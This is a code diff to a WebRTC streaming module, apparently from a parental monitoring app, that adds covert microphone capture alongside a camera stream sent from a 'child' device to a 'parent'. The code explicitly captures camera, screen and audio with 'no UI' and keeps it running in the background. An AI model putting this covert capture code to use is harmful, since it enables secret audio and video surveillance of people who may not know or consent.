@@ -83,6 +83,12 @@ let iceMonitorTimer: ReturnType<typeof setInterval> | null = null;
  */
 let displayMediaPending = false;
 let cameraSwitchInFlight = false;
+/** Audio stream captured alongside the camera; stopped in disconnectStream CAMERA cleanup. */
+let cameraAudioStream: MediaStream | null = null;
+/** Audio track captured alongside camera; added to PC directly (NOT via stream.addTrack which crashes with cross-stream tracks). */
+let cameraAudioTrack: MediaStreamTrack | null = null;
+/** Tracks the current camera facing so switchCamera toggles correctly (CameraX does not expose facingMode via getSettings). */
+let currentCameraFacing: 'user' | 'environment' = 'user';
 let detachIceRecovery: (() => void) | null = null;
 const seenIds = new Set<string>();
 const pendingIceCandidates: RTCIceCandidateInit[] = [];
@@ -350,23 +356,30 @@ function attachConnectionHandlers(peer: RTCPeerConnection): void {
     },
   });
 
-  peer.oniceconnectionstatechange = () => {
-    const state = peer.iceConnectionState ?? 'unknown';
-    slog('PC', 'iceConnectionState', state);
-    logIce('child', 'iceConnectionState', state);
-    if (state === 'connected' || state === 'completed') {
-      streamStateTransition('CONNECTED', 'oniceconnectionstatechange', {state, roomId: activeRoomId});
-      markJsActive();
-      flowLog('WEBRTC_FLOW', 'ICE_CONNECTED', {state, roomId: activeRoomId});
-      streamingApi
-        .reportIceConnectivity({
-          streamType: activeStreamType,
-          sessionId: activeSessionId ?? undefined,
-          iceConnectionState: state,
-        })
-        .catch(() => undefined);
-    }
-  };
+    peer.oniceconnectionstatechange = () => {
+      const state = peer.iceConnectionState ?? 'unknown';
+      slog('PC', 'iceConnectionState', state);
+      logIce('child', 'iceConnectionState', state);
+      if (state === 'connected' || state === 'completed') {
+        streamStateTransition('CONNECTED', 'oniceconnectionstatechange', {state, roomId: activeRoomId});
+        markJsActive();
+        flowLog('WEBRTC_FLOW', 'ICE_CONNECTED', {state, roomId: activeRoomId});
+        if (activeStreamType === 'CAMERA') {
+          flowLog('CAMERA_FLOW', 'ICE_CONNECTED', {state, roomId: activeRoomId, sessionId: activeSessionId});
+        }
+        streamingApi
+          .reportIceConnectivity({
+            streamType: activeStreamType,
+            sessionId: activeSessionId ?? undefined,
+            iceConnectionState: state,
+          })
+          .catch(() => undefined);
+      } else if (state === 'failed' || state === 'disconnected') {
+        if (activeStreamType === 'CAMERA') {
+          flowLog('CAMERA_FLOW', 'ICE_STATE_CHANGED', {state, roomId: activeRoomId, sessionId: activeSessionId});
+        }
+      }
+    };
   peer.onconnectionstatechange = () => {
     slog('PC', 'connectionState', peer.connectionState ?? 'unknown');
     logIce('child', 'connectionState', peer.connectionState ?? 'unknown');
@@ -442,15 +455,50 @@ export async function connectChildStream(
         tracks: [data.track],
       } as {streamId: string; streamReactTag: string; tracks: object[]});
     } else if (streamType === 'CAMERA') {
-      flowLog('PERMISSION_FLOW', 'hidden camera capture — no UI', {sessionId});
+      flowLog('CAMERA_FLOW', 'CAMERA_COMMAND_RECEIVED', {sessionId, facing: cameraFacing});
       const facing = cameraFacing === 'environment' ? 'environment' : 'user';
+      currentCameraFacing = facing;
+      flowLog('CAMERA_FLOW', 'FOREGROUND_SERVICE_STARTING', {sessionId, facing});
       const data = await nativeModules.getHiddenCameraMediaStream(facing);
+      flowLog('CAMERA_FLOW', 'CAMERA_OPENED', {sessionId, streamId: data.streamId, facing});
       stream = new MediaStream({
         streamId: data.streamId,
         streamReactTag: data.streamId,
         tracks: [data.track],
       } as {streamId: string; streamReactTag: string; tracks: object[]});
-      await waitForCaptureTrackLive(stream.getVideoTracks()[0]);
+      const videoTrack = stream.getVideoTracks()[0];
+      flowLog('CAMERA_FLOW', 'VIDEO_TRACK_CREATED', {
+        sessionId,
+        trackId: videoTrack?.id,
+        enabled: videoTrack?.enabled,
+        readyState: videoTrack?.readyState,
+      });
+      await waitForCaptureTrackLive(videoTrack);
+
+      // Capture microphone alongside the camera so the parent can hear audio.
+      // IMPORTANT: Do NOT call stream.addTrack() — adding a track from a different
+      // native MediaStream crashes the WebRTC module on Android. Instead we store
+      // the audio track and add it directly to the PC after creation (below).
+      cameraAudioTrack = null;
+      try {
+        await nativeModules.setMonitoringAudioMode(true).catch(() => undefined);
+        const audioData = await nativeModules.getHiddenAudioMediaStream();
+        cameraAudioStream = new MediaStream({
+          streamId: audioData.streamId,
+          streamReactTag: audioData.streamId,
+          tracks: [audioData.track],
+        } as {streamId: string; streamReactTag: string; tracks: object[]});
+        const audioTrack = cameraAudioStream.getAudioTracks()[0];
+        if (audioTrack) {
+          cameraAudioTrack = audioTrack;
+          slog('CAMERA', 'mic track captured, will add to PC after creation', {trackId: audioTrack.id});
+          flowLog('CAMERA_FLOW', 'MIC_TRACK_CAPTURED', {sessionId, trackId: audioTrack.id});
+        }
+      } catch (audioErr) {
+        slog('CAMERA', 'mic capture skipped (non-fatal)', String(audioErr));
+        cameraAudioStream = null;
+        cameraAudioTrack = null;
+      }
     } else {
       flowLog('MEDIA_PROJECTION', 'hidden screen capture — no UI', {sessionId});
       const data = await nativeModules.getHiddenScreenMediaStream();
@@ -533,18 +581,35 @@ export async function connectChildStream(
       }
     });
 
-    flowLog('SCREEN_SHARE_FLOW', 'createOffer start', {roomId, sessionId, streamType});
+    // For CAMERA streams: add the audio track directly to the PC (not via stream.addTrack,
+    // which crashes when the track originates from a different native MediaStream).
+    if (streamType === 'CAMERA' && cameraAudioTrack) {
+      pc?.addTrack(cameraAudioTrack, stream);
+      slog('PC', 'addTrack camera mic', {kind: 'audio', id: cameraAudioTrack.id});
+      flowLog('CAMERA_FLOW', 'MIC_TRACK_ADDED_TO_PC', {sessionId, trackId: cameraAudioTrack.id});
+    }
+
+    const offerLabel = streamType === 'CAMERA' ? 'CAMERA_FLOW' : 'SCREEN_SHARE_FLOW';
+    flowLog(offerLabel, 'OFFER_CREATING', {roomId, sessionId, streamType});
     const offer = await pc.createOffer({offerToReceiveAudio: false, offerToReceiveVideo: false});
-    flowLog('SCREEN_SHARE_FLOW', 'createOffer success', {roomId, sessionId, streamType});
-    flowLog('WEBRTC_FLOW', sdpHasVideoMline(offer.sdp) ? 'OFFER_CONTAINS_VIDEO' : 'OFFER_MISSING_VIDEO', {
+    const offerHasVideo = sdpHasVideoMline(offer.sdp);
+    flowLog(offerLabel, 'OFFER_CREATED', {roomId, sessionId, streamType, hasVideo: offerHasVideo});
+    flowLog('WEBRTC_FLOW', offerHasVideo ? 'OFFER_CONTAINS_VIDEO' : 'OFFER_MISSING_VIDEO', {
       roomId,
       sessionId,
     });
+    if (streamType === 'CAMERA' && !offerHasVideo) {
+      slog('SDP', 'WARN camera offer has no video m-line — frames may not be flowing yet', {roomId, sessionId});
+    }
     await pc.setLocalDescription(offer);
     streamStateTransition('LOCAL_DESCRIPTION_SET', 'connectChildStream', {roomId, sessionId});
     await signalingApi.post(roomId, 'offer', JSON.stringify(offer), sessionId);
     slog('SDP', 'offer sent', roomId);
-    flowLog('SCREEN_SHARE_FLOW', 'offer sent', {roomId, sessionId});
+    if (streamType === 'CAMERA') {
+      flowLog('CAMERA_FLOW', 'OFFER_SENT', {roomId, sessionId, hasVideo: offerHasVideo});
+    } else {
+      flowLog('SCREEN_SHARE_FLOW', 'offer sent', {roomId, sessionId});
+    }
     logIce('child', 'offer sent');
 
     pollTimer = setInterval(() => {
@@ -552,6 +617,9 @@ export async function connectChildStream(
     }, 500);
 
     const answerOk = await waitForRemoteAnswer(roomId);
+    if (streamType === 'CAMERA') {
+      flowLog('CAMERA_FLOW', answerOk ? 'ANSWER_RECEIVED' : 'ANSWER_TIMEOUT', {roomId, sessionId});
+    }
     // W3 fix: stop the 500 ms poll once the answer is in hand.
     // Continuing to poll throughout the session caused a DB read storm:
     // 2 polls/sec × both sides × N sessions = thousands of unnecessary reads.
@@ -591,6 +659,9 @@ function stopTrackSafely(track: MediaStreamTrack, label: string): void {
 }
 
 export async function disconnectStream(clearConnecting = true): Promise<void> {
+  if (activeStreamType === 'CAMERA') {
+    flowLog('CAMERA_FLOW', 'STREAM_STOPPED', {room: activeRoomId, sessionId: activeSessionId});
+  }
   slog('FLOW', 'disconnectStream', {room: activeRoomId, clearConnecting});
   detachIceRecovery?.();
   detachIceRecovery = null;
@@ -630,6 +701,12 @@ export async function disconnectStream(clearConnecting = true): Promise<void> {
   if (hadActiveStream) {
     if (streamTypeToStop === 'CAMERA') {
       await nativeModules.stopHiddenCameraStream().catch(() => undefined);
+      // Camera sessions also capture microphone — stop that too.
+      if (cameraAudioStream) {
+        await nativeModules.stopHiddenAudioStream().catch(() => undefined);
+        cameraAudioStream = null;
+      }
+      cameraAudioTrack = null;
     } else if (streamTypeToStop === 'AUDIO') {
       await nativeModules.stopHiddenAudioStream().catch(() => undefined);
     } else {
@@ -663,11 +740,10 @@ export async function switchCamera(): Promise<void> {
 
   cameraSwitchInFlight = true;
   try {
-    const settings = (
-      videoTrack as MediaStreamTrack & {getSettings?: () => {facingMode?: string}}
-    ).getSettings?.();
-    const nextFacing = settings?.facingMode === 'environment' ? 'user' : 'environment';
-    slog('CAMERA', 'switching', {from: settings?.facingMode ?? 'unknown', to: nextFacing});
+    // CameraX tracks do not expose facingMode via getSettings(), so we track
+    // the current facing in a module-level variable and toggle it.
+    const nextFacing = currentCameraFacing === 'environment' ? 'user' : 'environment';
+    slog('CAMERA', 'switching', {from: currentCameraFacing, to: nextFacing});
 
     // replaceTrack via hidden camera path works when backgrounded on Android 14+.
     if (Platform.OS === 'android') {
@@ -688,6 +764,7 @@ export async function switchCamera(): Promise<void> {
       }
       activeMediaStream.removeTrack(videoTrack);
       activeMediaStream.addTrack(newTrack);
+      currentCameraFacing = nextFacing;
       slog('CAMERA', 'switched via hidden capture replaceTrack', {facing: nextFacing});
       return;
     }
